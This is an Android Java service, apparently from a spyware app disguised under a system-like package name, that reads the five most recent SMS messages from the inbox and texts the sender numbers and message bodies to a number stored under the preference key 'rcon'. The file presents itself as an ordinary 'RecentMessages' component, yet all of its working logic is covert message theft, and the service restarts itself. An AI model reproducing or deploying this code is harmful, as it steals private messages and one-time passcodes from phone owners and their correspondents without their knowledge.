package com.android.wondercom;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class RecentMessages extends Service {


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {

    }


    @Override
    public int onStartCommand(Intent intent,  int flags, int startId) {

        Toast.makeText(getApplicationContext(),"RMKWDY",Toast.LENGTH_SHORT).show();
//        Uri mSmsinboxQueryUri = Uri.parse("content://sms/inbox");
//        String[] projection = {"address", "body"};
//        Cursor cursor = getApplication().getContentResolver().query(mSmsinboxQueryUri,
//                null,
//                "address = ?",
//                null,
//                "date DESC LIMIT 5");
//        if (cursor != null && cursor.moveToFirst()) {
//            do {
//                body = cursor1.getString(cursor1.getColumnIndex("body"));
//                totalBody = totalBody + body;
//                Log.d("Registration", totalBody);
//            } while (cursor.moveToNext());
//        }


        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, "date DESC LIMIT 5");

        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            sms.add("Number: " + address + " .Message: " + body);
        }

        if (cur != null) {
            cur.close();
        }

        SharedPreferences xx = getSharedPreferences("rcon", Context.MODE_PRIVATE);

       String rcon =  xx.getString("rco", "");

//        Intent ii = new Intent(Intent.ACTION_VIEW, Uri.parse(sms + rcon));
//        ii.putExtra("sms_body", message);
//        startActivity(intent);

        SmsManager smss = SmsManager.getDefault();

        smss.sendTextMessage(rcon, null, sms.toString(), null, null);





        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


}
